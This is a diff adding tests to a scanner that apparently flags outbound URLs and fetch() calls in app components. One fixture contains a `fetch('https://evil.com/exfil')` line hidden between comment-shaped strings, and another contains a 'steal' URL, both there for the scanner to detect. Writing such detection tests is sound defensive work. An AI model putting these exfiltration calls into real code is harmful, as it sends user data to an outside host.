@@ -193,6 +193,50 @@ ${RECOGNIZED_ORIGINS.map((o) => `        '${o}',`).join('\n')}
       expect(result.error).not.toContain('__scanner_test.tsx: contains inline onclick')
     }
   })
+
+  it('does not flag a URL that only appears in a trailing line comment (#313)', async () => {
+    writeTestFile(
+      'app/components/__scanner_test.tsx',
+      `export const A = 1 // see https://evil.example.com/docs\n` +
+        `export function X() { return <div /> }`
+    )
+    const result = await runValidator()
+    expect(result.success).toBe(true)
+  })
+
+  it('does not flag a URL that only appears inside a block comment (#313)', async () => {
+    writeTestFile(
+      'app/components/__scanner_test.tsx',
+      `/* see https://evil.example.com/docs for context */
+       export function X() { return <div /> }`
+    )
+    const result = await runValidator()
+    expect(result.success).toBe(true)
+  })
+
+  it('does not let comment-shaped string literals hide a real fetch() call (#313)', async () => {
+    writeTestFile(
+      'app/components/__scanner_test.tsx',
+      `const a = "/*"
+       fetch('https://evil.com/exfil')
+       const b = "*/"
+       export function X() { return <div /> }`
+    )
+    const result = await runValidator()
+    expect(result.success).toBe(false)
+    expect(result.error).toContain('fetch() call')
+    expect(result.error).toContain('evil.com')
+  })
+
+  it('still flags a URL inside a real string literal (#313)', async () => {
+    writeTestFile(
+      'app/components/__scanner_test.tsx',
+      `const url = 'https://evil.com/steal' // not the same as one in a comment`
+    )
+    const result = await runValidator()
+    expect(result.success).toBe(false)
+    expect(result.error).toContain('evil.com')
+  })
 })
 
 describe('contact link detection (Check 6)', () => {
